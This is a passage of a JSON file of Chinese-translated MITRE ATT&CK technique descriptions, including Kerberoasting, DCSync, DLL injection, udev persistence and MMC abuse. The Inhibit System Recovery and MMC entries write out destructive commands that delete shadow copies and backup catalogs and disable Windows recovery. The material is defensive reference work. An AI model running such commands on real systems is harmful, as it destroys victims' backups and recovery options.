        "translated_description": "攻击者可能滥用有效的Kerberos票证授予票证（TGT）或嗅探网络流量以获取可能易受[暴力破解](https://attack.mitre.org/techniques/T1110)攻击的票证授予服务（TGS）票证。(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) \n\n服务主体名称（SPN）用于唯一标识每个Windows服务实例。为了启用身份验证，Kerberos要求SPN与至少一个服务登录账户（专门用于运行服务的账户(Citation: Microsoft Detecting Kerberoasting Feb 2018)）相关联。(Citation: Microsoft SPN)(Citation: Microsoft SetSPN)(Citation: SANS Attacking Kerberos Nov 2014)(Citation: Harmj0y Kerberoast Nov 2016)\n\n拥有有效Kerberos票证授予票证（TGT）的攻击者可以从域控制器（DC）请求一个或多个Kerberos票证授予服务（TGS）服务票证。(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) 这些票证的部分可能使用RC4算法加密，这意味着与SPN关联的服务账户的Kerberos 5 TGS-REP etype 23哈希被用作私钥，因此容易受到离线[暴力破解](https://attack.mitre.org/techniques/T1110)攻击，可能暴露明文凭证。(Citation: AdSecurity Cracking Kerberos Dec 2015)(Citation: Empire InvokeKerberoast Oct 2016) (Citation: Harmj0y Kerberoast Nov 2016)\n\n可以使用从网络流量中捕获的服务票证执行相同的行为。(Citation: AdSecurity Cracking Kerberos Dec 2015)\n\n破解的哈希可能通过访问[有效账户](https://attack.mitre.org/techniques/T1078)启用[持久性](https://attack.mitre.org/tactics/TA0003)、[权限提升](https://attack.mitre.org/tactics/TA0004)和[横向移动](https://attack.mitre.org/tactics/TA0008)。(Citation: SANS Attacking Kerberos Nov 2014)"
    },
    "DCSync": {
        "translated_name": "DCSync",
        "translated_description": "攻击者可能通过滥用Windows域控制器的应用程序编程接口（API）(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) (Citation: Wine API samlib.dll) 来模拟从远程域控制器复制过程，使用称为DCSync的技术。\n\n管理员、域管理员和企业管理员组的成员或域控制器上的计算机账户能够运行DCSync以从Active Directory中提取密码数据(Citation: ADSecurity Mimikatz DCSync)，这可能包括KRBTGT和管理员等潜在有用账户的当前和历史哈希。这些哈希随后可以用于创建[黄金票证](https://attack.mitre.org/techniques/T1558/001)，用于[传递票证](https://attack.mitre.org/techniques/T1550/003)(Citation: Harmj0y Mimikatz and DCSync) 或更改账户密码，如[账户操纵](https://attack.mitre.org/techniques/T1098)中所述。(Citation: InsiderThreat ChangeNTLM July 2017)\n\nDCSync功能已包含在[Mimikatz](https://attack.mitre.org/software/S0002)的“lsadump”模块中。(Citation: GitHub Mimikatz lsadump Module) Lsadump还包括NetSync，它通过旧版复制协议执行DCSync。(Citation: Microsoft NRPC Dec 2017)"
    },
    "System Time Discovery": {
        "translated_name": "系统时间发现",
        "translated_description": "攻击者可能从本地或远程系统收集系统时间和/或时区设置。系统时间由服务设置和存储，例如Windows上的Windows时间服务或macOS上的<code>systemsetup</code>。(Citation: MSDN System Time)(Citation: Technet Windows Time Service)(Citation: systemsetup mac time) 这些时间设置也可能在企业网络中的系统和服务之间同步，通常通过域内的网络时间服务器完成。(Citation: Mac Time Sync)(Citation: linux system time)\n\n系统时间信息可以通过多种方式收集，例如在Windows上使用[Net](https://attack.mitre.org/software/S0039)执行<code>net time \\\\hostname</code>以收集远程系统上的系统时间。受害者的时区也可以通过当前系统时间推断或使用<code>w32tm /tz</code>收集。(Citation: Technet Windows Time Service) 此外，攻击者可以通过<code>GetTickCount()</code>等函数发现设备运行时间，以确定系统启动以来的时间。(Citation: Virtualization/Sandbox Evasion)\n\n在网络设备上，[网络设备CLI](https://attack.mitre.org/techniques/T1059/008)命令（如`show clock detail`）可用于查看当前时间配置。(Citation: show_clock_detail_cisco_cmd)\n\n此外，系统调用（如<code>time()</code>）已用于收集Linux设备上的当前时间。(Citation: MAGNET GOBLIN) 在macOS系统上，攻击者可能使用<code>systemsetup -gettimezone</code>或<code>timeIntervalSinceNow</code>等命令收集当前时区信息或当前日期和时间。(Citation: System Information Discovery Technique)(Citation: ESET DazzleSpy Jan 2022)\n\n此信息可能有助于执行其他技术，例如使用[计划任务/作业](https://attack.mitre.org/techniques/T1053)执行文件(Citation: RSA EU12 They're Inside)，或根据时区发现位置信息以协助受害者定位（即[系统位置发现](https://attack.mitre.org/techniques/T1614)）。攻击者还可能使用系统时间知识作为定时炸弹的一部分，或延迟执行直到指定的日期/时间。(Citation: AnyRun TimeBomb)"
    },
    "At": {
        "translated_name": "At",
        "translated_description": "攻击者可能滥用[at](https://attack.mitre.org/software/S0110)实用程序来执行任务调度，以初始或重复执行恶意代码。[at](https://attack.mitre.org/software/S0110)实用程序作为Windows、Linux和macOS中的可执行文件存在，用于在指定的时间和日期调度任务。尽管在Windows环境中已弃用，转而使用[计划任务](https://attack.mitre.org/techniques/T1053/005)的[schtasks](https://attack.mitre.org/software/S0111)，但使用[at](https://attack.mitre.org/software/S0110)需要任务调度程序服务正在运行，并且用户必须以本地管理员组成员的身份登录。除了显式运行`at`命令外，攻击者还可以通过直接利用[Windows管理工具](https://attack.mitre.org/techniques/T1047) `Win32_ScheduledJob` WMI类来调度任务。(Citation: Malicious Life by Cybereason)\n\n在Linux和macOS上，超级用户以及添加到<code>at.allow</code>文件中的任何用户都可以调用[at](https://attack.mitre.org/software/S0110)。如果<code>at.allow</code>文件不存在，则检查<code>at.deny</code>文件。未列在<code>at.deny</code>中的每个用户名都允许调用[at](https://attack.mitre.org/software/S0110)。如果<code>at.deny</code>存在且为空，则允许全局使用[at](https://attack.mitre.org/software/S0110)。如果两个文件都不存在（通常是基线情况），则只有超级用户可以使用[at](https://attack.mitre.org/software/S0110)。(Citation: Linux at)\n\n攻击者可能使用[at](https://attack.mitre.org/software/S0110)在系统启动时或按计划执行程序以实现[持久性](https://attack.mitre.org/tactics/TA0003)。[at](https://attack.mitre.org/software/S0110)还可用于在[横向移动](https://attack.mitre.org/tactics/TA0008)期间进行远程[执行](https://attack.mitre.org/tactics/TA0002)或在指定账户（如SYSTEM）的上下文中运行进程。\n\n在Linux环境中，攻击者还可能滥用[at](https://attack.mitre.org/software/S0110)通过任务生成交互式系统shell或运行系统命令来突破受限环境。同样，如果二进制文件允许通过<code>sudo</code>以超级用户身份运行，[at](https://attack.mitre.org/software/S0110)也可用于[权限提升](https://attack.mitre.org/tactics/TA0004)。(Citation: GTFObins at)"
    },
    "Dynamic-link Library Injection": {
        "translated_name": "动态链接库注入",
        "translated_description": "对手可能会注入动态链接库（DLL）到进程中，以规避基于进程的防御并可能提升权限。DLL注入是一种在独立活动进程的地址空间中执行任意代码的方法。\n\nDLL注入通常通过在目标进程的虚拟地址空间中写入DLL路径，然后通过调用新线程加载DLL来执行。写入可以通过本机Windows API调用如<code>VirtualAllocEx</code>和<code>WriteProcessMemory</code>来执行，然后通过<code>CreateRemoteThread</code>（调用负责加载DLL的<code>LoadLibrary</code> API）来调用。(引用: Elastic Process Injection July 2017)\n\n这种方法的变体如反射DLL注入（将自映射DLL写入进程）和内存模块（在写入进程时映射DLL）克服了地址重定位问题以及调用执行的额外API（因为这些方法通过手动执行<code>LoadLibrary</code>的功能来加载和执行文件）。(引用: Elastic HuntingNMemory June 2017)(引用: Elastic Process Injection July 2017)\n\n这种方法的另一种变体，通常称为模块踩踏/重载或DLL空洞，可能被用来在进程中隐藏注入的代码。这种方法涉及将合法DLL加载到远程进程中，然后在目标进程中启动新线程之前手动覆盖模块的<code>AddressOfEntryPoint</code>。(引用: Module Stomping for Shellcode Injection) 这种变体允许攻击者通过在磁盘上可能备份其执行的合法DLL文件来隐藏恶意注入代码。(引用: Hiding Malicious Code with Module Stomping)\n\n在另一个进程的上下文中运行代码可能允许访问该进程的内存、系统/网络资源，并可能提升权限。通过DLL注入执行还可能规避安全产品的检测，因为执行被掩盖在合法进程下。"
    },
    "Modify Authentication Process": {
        "translated_name": "修改认证过程",
        "translated_description": "对手可能会修改认证机制和过程，以访问用户凭据或启用其他不必要的账户访问。认证过程由负责收集、存储和验证凭据的机制处理，例如Windows上的本地安全认证服务器（LSASS）进程和安全账户管理器（SAM），Unix系统上的可插拔认证模块（PAM），以及MacOS系统上的授权插件。通过修改认证过程，对手可能能够在不使用[有效账户](https://attack.mitre.org/techniques/T1078)的情况下认证到服务或系统。\n\n对手可能会恶意修改此过程的一部分，以揭示凭据或绕过认证机制。被破坏的凭据或访问可能用于绕过网络中系统上各种资源的访问控制，并可能用于对远程系统和外部可用服务（如VPN、Outlook Web Access和远程桌面）的持久访问。"
    },
    "Udev Rules": {
        "translated_name": "Udev规则",
        "translated_description": "对手可能通过使用udev规则执行恶意内容来保持持久性。Udev是Linux内核设备管理器，动态管理设备节点，处理/dev目录中的伪设备文件访问，并响应硬件事件，例如插入或移除外部设备如硬盘或键盘。Udev使用带有“匹配键”的规则文件来指定硬件事件必须满足的条件，并使用“动作键”来定义应执行的操作。创建、修改或删除位于/etc/udev/rules.d/、/run/udev/rules.d/、/usr/lib/udev/rules.d/、/usr/local/lib/udev/rules.d/和/lib/udev/rules.d/中的规则文件需要root权限。规则优先级由目录和规则文件名中的数字前缀决定。(引用: Ignacio Udev research 2024)(引用: Elastic Linux Persistence 2024)\n\n对手可能通过在udev规则文件中添加或修改规则来滥用udev子系统以执行恶意内容。例如，对手可能配置一个规则，每次应用程序访问伪设备文件（如/dev/random）时执行其二进制文件。尽管udev仅限于运行短任务，并受systemd-udevd的沙箱限制（阻止网络和文件系统访问），攻击者可能使用动作键RUN+=下的脚本命令在后台分离并运行恶意内容的进程，以绕过这些控制。(引用: Reichert aon sedexp 2024)"
    },
    "Credential API Hooking": {
        "translated_name": "凭据API挂钩",
        "translated_description": "对手可能会挂钩Windows应用程序编程接口（API）函数以收集用户凭据。恶意挂钩机制可能会捕获包含揭示用户认证凭据参数的API调用。(引用: Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017) 与[键盘记录](https://attack.mitre.org/techniques/T1056/001)不同，此技术专注于包含揭示用户凭据参数的API函数。挂钩涉及拦截这些函数的调用，并可以通过以下方式实现：\n\n* **挂钩过程**，拦截并在响应事件（如消息、按键和鼠标输入）时执行指定代码。(引用: Microsoft Hook Overview)(引用: Elastic Process Injection July 2017)\n* **导入地址表（IAT）挂钩**，通过修改进程的IAT，其中存储了指向导入API函数的指针。(引用: Elastic Process Injection July 2017)(引用: Adlice Software IAT Hooks Oct 2014)(引用: MWRInfoSecurity Dynamic Hooking 2015)\n* **内联挂钩**，覆盖API函数中的第一个字节以重定向代码流。(引用: Elastic Process Injection July 2017)(引用: HighTech Bridge Inline Hooking Sept 2011)(引用: MWRInfoSecurity Dynamic Hooking 2015)\n"
    },
    "Firmware Corruption": {
        "translated_name": "固件损坏",
        "translated_description": "对手可能会覆盖或损坏系统BIOS或附加到系统的设备中的固件内容，以使其无法操作或无法启动，从而拒绝使用设备和/或系统。(引用: Symantec Chernobyl W95.CIH) 固件是从硬件设备上的非易失性存储器加载和执行的软件，用于初始化和管理设备功能。这些设备可能包括主板、硬盘或显卡。\n\n一般来说，对手可能会操纵、覆盖或损坏固件，以拒绝使用系统或设备。例如，损坏负责加载操作系统的网络设备的固件可能会使网络设备无法操作。(引用: dhs_threat_to_net_devices)(引用: cisa_malware_orgs_ukraine) 根据设备的不同，此攻击还可能导致[数据销毁](https://attack.mitre.org/techniques/T1485)。"
    },
    "Inhibit System Recovery": {
        "translated_name": "抑制系统恢复",
        "translated_description": "对手可能会删除或移除内置数据并关闭旨在帮助恢复损坏系统的服务，以防止恢复。(引用: Talos Olympic Destroyer 2018)(引用: FireEye WannaCry 2017) 这可能会拒绝访问可用的备份和恢复选项。\n\n操作系统可能包含有助于修复损坏系统的功能，例如备份目录、卷影副本和自动修复功能。对手可能会禁用或删除系统恢复功能，以增强[数据销毁](https://attack.mitre.org/techniques/T1485)和[影响的数据加密](https://attack.mitre.org/techniques/T1486)的效果。(引用: Talos Olympic Destroyer 2018)(引用: FireEye WannaCry 2017) 此外，对手可能会禁用恢复通知，然后破坏备份。(引用: disable_notif_synology_ransom)\n\n对手已使用多种本机Windows实用程序禁用或删除系统恢复功能：\n\n* <code>vssadmin.exe</code> 可用于删除系统上的所有卷影副本 - <code>vssadmin.exe delete shadows /all /quiet</code>\n* [Windows管理工具](https://attack.mitre.org/techniques/T1047) 可用于删除卷影副本 - <code>wmic shadowcopy delete</code>\n* <code>wbadmin.exe</code> 可用于删除Windows备份目录 - <code>wbadmin.exe delete catalog -quiet</code>\n* <code>bcdedit.exe</code> 可用于通过修改引导配置数据禁用自动Windows恢复功能 - <code>bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no</code>\n* <code>REAgentC.exe</code> 可用于禁用Windows恢复环境（WinRE）修复/恢复选项\n* <code>diskshadow.exe</code> 可用于删除系统上的所有卷影副本 - <code>diskshadow delete shadows all</code> (引用: Diskshadow) (引用: Crytox Ransomware)\n\n在网络设备上，对手可能利用[磁盘擦除](https://attack.mitre.org/techniques/T1561)删除备份固件映像并重新格式化文件系统，然后[系统关闭/重启](https://attack.mitre.org/techniques/T1529)重新加载设备。结合起来，这些活动可能使网络设备完全无法操作并抑制恢复操作。\n\n对手还可能删除连接到其网络的“在线”备份 - 无论是通过网络存储介质还是通过同步到云服务的文件夹。(引用: ZDNet Ransomware Backups 2020) 在云环境中，对手可能禁用版本控制和备份策略，并删除快照、数据库备份、机器映像和设计用于灾难恢复场景的对象的先前版本。(引用: Dark Reading Code Spaces Cyber Attack)(引用: Rhino Security Labs AWS S3 Ransomware)"
    },
    "Netsh Helper DLL": {
        "translated_name": "Netsh Helper DLL",
        "translated_description": "对手可能通过执行由Netsh Helper DLL触发的恶意内容来建立持久性。Netsh.exe（也称为Netshell）是一个命令行脚本实用程序，用于与系统的网络配置交互。它包含添加帮助DLL以扩展实用程序功能的功能。(引用: TechNet Netsh) 注册的netsh.exe帮助DLL的路径输入到Windows注册表中的<code>HKLM\\SOFTWARE\\Microsoft\\Netsh</code>。\n\n对手可以使用netsh.exe帮助DLL以持久的方式触发任意代码的执行。此执行将在每次执行netsh.exe时发生，这可能会自动发生，使用另一种持久性技术，或者如果系统上存在其他软件（例如VPN），该软件在其正常功能的一部分中执行netsh.exe。(引用: Github Netsh Helper CS Beacon)(引用: Demaske Netsh Persistence)"
    },
    "Spearphishing via Service": {
        "translated_name": "通过服务的鱼叉式网络钓鱼",
        "translated_description": "对手可能通过第三方服务发送鱼叉式网络钓鱼消息，试图访问受害者系统。通过服务的鱼叉式网络钓鱼是一种特定的鱼叉式网络钓鱼变体。它与其他形式的鱼叉式网络钓鱼不同，因为它使用第三方服务而不是直接通过企业电子邮件渠道。\n\n所有形式的鱼叉式网络钓鱼都是针对特定个人、公司或行业的电子社交工程。在这种情况下，对手通过各种社交媒体服务、个人网络邮件和其他非企业控制的服务发送消息。(引用: Lookout Dark Caracal Jan 2018) 这些服务的安全策略可能比企业更宽松。与大多数鱼叉式网络钓鱼一样，目标是与目标建立关系或以某种方式引起目标的兴趣。对手会创建虚假的社交媒体账户并向员工发送潜在工作机会的消息。这样做可以合理地询问有关服务、策略和环境中运行的软件的信息。然后，对手可以通过这些服务发送恶意链接或附件。\n\n一个常见的例子是通过社交媒体与目标建立关系，然后将内容发送到目标在其工作计算机上使用的个人网络邮件服务。这允许对手绕过工作账户上的一些电子邮件限制，并且目标更有可能打开文件，因为这是他们期望的内容。如果有效负载未按预期工作，对手可以继续正常通信并与目标一起排除故障以使其正常工作。"
    },
    "Internal Proxy": {
        "translated_name": "内部代理",
        "translated_description": "对手可能使用内部代理在受感染环境中的两个或多个系统之间定向命令和控制流量。许多工具可以实现通过代理或端口重定向的流量重定向，包括[HTRAN](https://attack.mitre.org/software/S0040)、ZXProxy和ZXPortMap。(引用: Trend Micro APT Attack Tools) 对手使用内部代理来管理受感染环境内的命令和控制通信，以减少同时出站网络连接的数量，提供连接丢失时的弹性，或通过受感染系统之间的现有受信通信路径进行通信以避免怀疑。内部代理连接可能使用常见的点对点（p2p）网络协议，如SMB，以更好地融入环境。\n\n通过使用受感染的内部系统作为代理，对手可能隐藏C2流量的真实目的地，同时减少与外部系统的连接需求。"
    },
    "System Script Proxy Execution": {
        "translated_name": "系统脚本代理执行",
        "translated_description": "对手可能使用受信任的脚本（通常带有证书签名）代理恶意文件的执行。几个从Microsoft下载或在Windows安装中默认存在的Microsoft签名脚本可以用来代理其他文件的执行。(引用: LOLBAS Project) 对手可能滥用这种行为来执行恶意文件，这些文件可能绕过系统上的应用程序控制和签名验证。(引用: GitHub Ultimate AppLocker Bypass List)"
    },
    "Dead Drop Resolver": {
        "translated_name": "死信投递解析器",
        "translated_description": "对手可能使用现有的合法外部Web服务来托管指向其他命令和控制（C2）基础设施的信息。对手可能在Web服务上发布内容，称为死信投递解析器，其中嵌入（通常是混淆/编码的）域名或IP地址。一旦感染，受害者将联系这些解析器并被重定向。\n\n作为C2机制的流行网站和社交媒体可能提供大量掩护，因为网络中的主机在被攻破之前可能已经在与它们通信。使用Google或Twitter等常见服务使对手更容易隐藏在预期的噪音中。Web服务提供商通常使用SSL/TLS加密，为对手提供了额外的保护。\n\n使用死信投递解析器还可以通过恶意软件二进制分析保护后端C2基础设施免于被发现，同时也增强了操作弹性（因为这些基础设施可能会动态更改）。"
    },
    "Junk Data": {
        "translated_name": "垃圾数据",
        "translated_description": "对手可能会向用于命令和控制的协议添加垃圾数据，以使检测更加困难。(引用: FireEye SUNBURST Backdoor December 2020) 通过向用于命令和控制的协议添加随机或无意义的数据，对手可以防止使用简单方法解码、解密或以其他方式分析流量。示例可能包括在数据前后附加/预置垃圾字符或在重要字符之间写入垃圾字符。"
    },
    "Spearphishing Service": {
        "translated_name": "通过服务的鱼叉式网络钓鱼",
        "translated_description": "对手可能通过第三方服务发送鱼叉式网络钓鱼消息，以获取在目标定位期间使用的敏感信息。鱼叉式网络钓鱼是试图欺骗目标泄露信息，通常是凭据或其他可操作的信息。鱼叉式网络钓鱼通常涉及社交工程技术，例如冒充有理由收集信息的来源（例如[建立账户](https://attack.mitre.org/techniques/T1585)或[破坏账户](https://attack.mitre.org/techniques/T1586)）和/或发送多个看似紧急的消息。\n\n所有形式的鱼叉式网络钓鱼都是针对特定个人、公司或行业的电子社交工程。在这种情况下，对手通过各种社交媒体服务、个人网络邮件和其他非企业控制的服务发送消息。(引用: ThreatPost Social Media Phishing) 这些服务的安全策略可能比企业更宽松。与大多数鱼叉式网络钓鱼一样，目标是与目标建立关系或以某种方式引起目标的兴趣。对手可能会创建虚假的社交媒体账户并向员工发送潜在工作机会的消息。这样做可以合理地询问有关服务、策略和环境中运行的软件的信息。对手还可能使用先前侦察工作的信息（例如[社交媒体](https://attack.mitre.org/techniques/T1593/001)或[搜索受害者拥有的网站](https://attack.mitre.org/techniques/T1594)）来制作有说服力和可信的诱饵。"
    },
    "Container API": {
        "translated_name": "容器API",
        "translated_description": "对手可能通过容器环境中的API收集凭据。这些环境中的API，例如Docker API和Kubernetes API，允许用户远程管理其容器资源和集群组件。(引用: Docker API)(引用: Kubernetes API)\n\n对手可能访问Docker API以收集包含云、容器和环境中各种其他资源凭据的日志。(引用: Unit 42 Unsecured Docker Daemons) 拥有足够权限的对手，例如通过pod的服务账户，也可能使用Kubernetes API从Kubernetes API服务器检索凭据。这些凭据可能包括用于Docker API认证的凭据或来自Kubernetes集群组件的秘密。"
    },
    "SQL Stored Procedures": {
        "translated_name": "SQL存储过程",
        "translated_description": "对手可能滥用SQL存储过程在系统上建立持久访问。SQL存储过程是可以保存和重用的代码，以便数据库用户不必浪费时间重写经常使用的SQL查询。存储过程可以通过使用过程名称的SQL语句或通过定义的事件（例如启动/重启SQL服务器应用程序时）调用。\n\n对手可能会编写恶意存储过程，这些过程可以在SQL数据库服务器中提供持久机制。(引用: NetSPI Startup Stored Procedures)(引用: Kaspersky MSSQL Aug 2019) 要通过SQL语法执行操作系统命令，对手可能需要启用其他功能，例如MSSQL Server的xp_cmdshell。(引用: NetSPI Startup Stored Procedures)(引用: Kaspersky MSSQL Aug 2019)(引用: Microsoft xp_cmdshell 2017)\n\nMicrosoft SQL Server可以启用通用语言运行时（CLR）集成。启用CLR集成后，应用程序开发人员可以使用任何.NET框架语言（例如VB .NET、C#等）编写存储过程。(引用: Microsoft CLR Integration 2017) 对手可能会编写或修改与存储过程链接的CLR程序集，因为这些CLR程序集可以执行任意命令。(引用: NetSPI SQL Server CLR)"
    },
    "Network Device Authentication": {
        "translated_name": "网络设备认证",
        "translated_description": "对手可能使用[修补系统镜像](https://attack.mitre.org/techniques/T1601/001)在操作系统中硬编码密码，从而绕过网络设备本地账户的本机认证机制。\n\n[修改系统镜像](https://attack.mitre.org/techniques/T1601)可能包括在网络设备的操作系统中植入代码，以便对手使用特定密码进行访问。修改包括通过修补在操作系统镜像中植入特定密码。认证尝试时，插入的代码将首先检查用户输入是否为密码。如果是，则授予访问权限。否则，植入的代码将传递凭据以验证可能有效的凭据。(引用: Mandiant - Synful Knock)"
    },
    "Disk Content Wipe": {
        "translated_name": "磁盘内容擦除",
        "translated_description": "对手可能会擦除特定系统或网络中大量系统上的存储设备内容，以中断系统和网络资源的可用性。\n\n对手可能会部分或完全覆盖存储设备的内容，使数据通过存储接口无法恢复。(引用: Novetta Blockbuster)(引用: Novetta Blockbuster Destructive Malware)(引用: DOJ Lazarus Sony 2018) 对手可能会擦除磁盘内容的任意部分，而不是擦除特定的磁盘结构或文件。要擦除磁盘内容，对手可能需要直接访问硬盘以覆盖任意大小的磁盘部分，使用随机数据。(引用: Novetta Blockbuster Destructive Malware) 对手还被观察到利用第三方驱动程序如[RawDisk](https://attack.mitre.org/software/S0364)直接访问磁盘内容。(引用: Novetta Blockbuster)(引用: Novetta Blockbuster Destructive Malware) 这种行为与[数据销毁](https://attack.mitre.org/techniques/T1485)不同，因为擦除的是磁盘的部分而不是单个文件。\n\n为了最大限度地影响目标组织，在网络范围内中断可用性的操作中，设计用于擦除磁盘内容的恶意软件可能具有类似蠕虫的功能，通过利用其他技术如[有效账户](https://attack.mitre.org/techniques/T1078)、[操作系统凭据转储](https://attack.mitre.org/techniques/T1003)和[SMB/Windows管理共享](https://attack.mitre.org/techniques/T1021/002)在网络中传播。(引用: Novetta Blockbuster Destructive Malware)"
    },
    "Messaging Applications": {
        "translated_name": "消息应用程序",
        "translated_description": "对手可能利用聊天和消息应用程序，如Microsoft Teams、Google Chat和Slack，来挖掘有价值的信息。\n\n以下是一些可能对对手有潜在价值的信息示例，并且可能在消息应用程序中找到：\n\n* 测试/开发凭据（即[聊天消息](https://attack.mitre.org/techniques/T1552/008)）\n* 源代码片段\n* 指向网络共享和其他内部资源的链接\n* 专有数据(引用: Guardian Grand Theft Auto Leak 2022)\n* 有关正在进行的事件响应工作的讨论(引用: SC Magazine Ragnar Locker 2021)(引用: Microsoft DEV-0537)\n\n除了从消息应用程序中外泄数据外，对手还可能利用聊天消息中的数据来改进其目标定位——例如，通过了解更多有关环境的信息或规避正在进行的事件响应工作。(引用: Sentinel Labs NullBulge 2024)(引用: Permiso Scattered Spider 2023)"
    },
    "Exfiltration Over Unencrypted Non-C2 Protocol": {
        "translated_name": "通过未加密的非C2协议外泄",
        "translated_description": "对手可能通过未加密的网络协议（而不是现有的命令和控制通道）外泄数据。数据也可能被发送到与主要命令和控制服务器不同的网络位置。(引用: copy_cmd_cisco)\n\n对手可能选择在本地未加密的网络协议（如HTTP、FTP或DNS）中混淆这些数据，而不使用加密。这可能包括自定义或公开可用的编码/压缩算法（如base64）以及在协议头和字段中嵌入数据。"
    },
    "Dylib Hijacking": {
        "translated_name": "Dylib劫持",
        "translated_description": "对手可能通过在受害者应用程序在运行时搜索的路径中放置具有预期名称的恶意动态库（dylib）来执行其负载。动态加载器将根据搜索路径的顺序尝试查找dylib。dylib的路径可能以<code>@rpath</code>为前缀，这允许开发人员使用相对路径在运行时根据可执行文件的位置指定一组搜索路径。此外，如果使用弱链接，例如<code>LC_LOAD_WEAK_DYLIB</code>函数，即使预期的dylib不存在，应用程序仍将执行。弱链接使开发人员能够在添加新API的多个macOS版本上运行应用程序。\n\n对手可能通过在识别的路径中插入具有缺失dylib名称的恶意dylib来获得执行。(引用: Wardle Dylib Hijack Vulnerable Apps)(引用: Wardle Dylib Hijacking OSX 2015)(引用: Github EmpireProject HijackScanner)(引用: Github EmpireProject CreateHijacker Dylib) dylib被加载到应用程序的地址空间中，允许恶意dylib继承应用程序的权限级别和资源。根据应用程序的不同，这可能导致权限提升和不受限制的网络访问。由于执行被掩盖在合法进程下，此方法还可能逃避安全产品的检测。(引用: Writing Bad Malware for OSX)(引用: wardle artofmalware volume1)(引用: MalwareUnicorn macOS Dylib Injection MachO)"
    },
    "Downgrade System Image": {
        "translated_name": "降级系统镜像",
        "translated_description": "对手可能通过安装网络设备操作系统的旧版本来削弱安全性。网络设备上的旧操作系统版本通常具有较弱的加密算法，并且通常具有较少/较少更新的防御功能。(引用: Cisco Synful Knock Evolution)\n\n在嵌入式设备上，降级版本通常只需要替换存储中的操作系统文件。对于大多数嵌入式设备，这可以通过下载所需版本的操作系统文件并重新配置设备以在下次系统重启时从该文件启动来实现。对手然后可以立即重启设备以实施更改，或者他们可以等待系统下次重启。\n\n降级系统镜像到旧版本可能允许对手通过启用诸如[削弱加密](https://attack.mitre.org/techniques/T1600)之类的行为来规避防御。降级系统镜像可以单独完成，也可以与[修补系统镜像](https://attack.mitre.org/techniques/T1601/001)结合使用。"
    },
    "Local Accounts": {
        "translated_name": "本地账户",
        "translated_description": "对手可能获取和滥用本地账户的凭据，作为获得初始访问、持久性、权限提升或规避防御的手段。本地账户是组织为用户、远程支持、服务或单个系统或服务的管理配置的账户。\n\n本地账户也可能被滥用以提升权限并通过[操作系统凭据转储](https://attack.mitre.org/techniques/T1003)收集凭据。密码重用可能允许在网络上的一组机器上滥用本地账户，以实现权限提升和横向移动。"
    },
    "Exploitation for Defense Evasion": {
        "translated_name": "利用漏洞进行防御规避",
        "translated_description": "对手可能利用系统或应用程序漏洞来绕过安全功能。漏洞利用发生在对手利用程序、服务或操作系统软件或内核本身中的编程错误来执行对手控制的代码时。漏洞可能存在于防御安全软件中，可以用来禁用或绕过它们。\n\n对手可能通过侦察事先了解环境中存在的安全软件，或者在系统被攻破期间或之后进行检查以进行[安全软件发现](https://attack.mitre.org/techniques/T1518/001)。安全软件可能会被直接针对进行漏洞利用。有例子表明，持久威胁组织针对防病毒软件以避免检测。\n\n也有例子表明，公共云基础设施中的漏洞可能绕过防御边界(引用: Salesforce zero-day in facebook phishing attack)，规避安全日志(引用: Bypassing CloudTrail in AWS Service Catalog)，或部署隐藏基础设施。(引用: GhostToken GCP flaw)"
    },
    "Trusted Developer Utilities Proxy Execution": {
        "translated_name": "受信任的开发者工具代理执行",
        "translated_description": "对手可能利用受信任的开发者工具代理执行恶意负载。有许多用于软件开发相关任务的工具可以用来以各种形式执行代码，以协助开发、调试和逆向工程。(引用: engima0x3 DNX Bypass)(引用: engima0x3 RCSI Bypass)(引用: Exploit Monday WinDbg)(引用: LOLBAS Tracker) 这些工具可能经常使用合法证书签名，允许它们在系统上执行，并通过受信任的进程代理执行恶意代码，从而有效地绕过应用程序控制解决方案。"
    },
    "System Shutdown/Reboot": {
        "translated_name": "系统关闭/重启",
        "translated_description": "对手可能关闭/重启系统以中断对这些系统的访问或帮助销毁这些系统。操作系统可能包含用于启动机器或网络设备关闭/重启的命令。在某些情况下，这些命令还可以用于通过[网络设备CLI](https://attack.mitre.org/techniques/T1059/008)（例如<code>reload</code>）启动远程计算机或网络设备的关闭/重启。(引用: Microsoft Shutdown Oct 2017)(引用: alert_TA18_106A)\n\n关闭或重启系统可能会中断合法用户对计算机资源的访问，同时也会阻碍事件响应/恢复。\n\n对手可能在以其他方式影响系统后尝试关闭/重启系统，例如[磁盘结构擦除](https://attack.mitre.org/techniques/T1561/002)或[抑制系统恢复](https://attack.mitre.org/techniques/T1490)，以加速对系统可用性的预期影响。(引用: Talos Nyetya June 2017)(引用: Talos Olympic Destroyer 2018)"
    },
    "MMC": {
        "translated_name": "MMC",
        "translated_description": "对手可能滥用mmc.exe代理执行恶意.msc文件。Microsoft管理控制台（MMC）是一个可能由Microsoft签名的二进制文件，可以在其GUI或命令提示符中以多种方式使用。(引用: win_mmc)(引用: what_is_mmc) MMC可用于创建、打开和保存包含Microsoft创建的管理工具的自定义控制台，称为管理单元。这些管理单元可用于本地或远程管理Windows系统。MMC还可用于打开Microsoft创建的.msc文件以管理系统配置。(引用: win_msc_files_overview)\n\n例如，<code>mmc C:\\Users\\foo\\admintools.msc /a</code>将以作者模式打开自定义保存的控制台msc文件。(引用: win_mmc) 另一个常见的例子是<code>mmc gpedit.msc</code>，它将打开组策略编辑器应用程序窗口。\n\n对手可能使用MMC命令执行恶意任务。例如，<code>mmc wbadmin.msc delete catalog -quiet</code>在没有用户提示的情况下删除系统上的备份目录（即[抑制系统恢复](https://attack.mitre.org/techniques/T1490)）（注意：<code>wbadmin.msc</code>可能仅在默认情况下存在于Windows Server操作系统上）。(引用: win_wbadmin_delete_catalog)(引用: phobos_virustotal)\n\n对手还可能滥用MMC执行恶意.msc文件。例如，对手可能首先创建一个恶意注册表类标识符（CLSID）子键，该子键唯一标识一个[组件对象模型](https://attack.mitre.org/techniques/T1559/001)类对象。(引用: win_clsid_key) 然后，对手可能创建带有“链接到Web地址”管理单元的自定义控制台，该管理单元链接到恶意CLSID子键。(引用: mmc_vulns) 一旦.msc文件保存，对手可能使用以下命令调用恶意CLSID负载：<code>mmc.exe -Embedding C:\\path\\to\\test.msc</code>。(引用: abusing_com_reg)"
    },
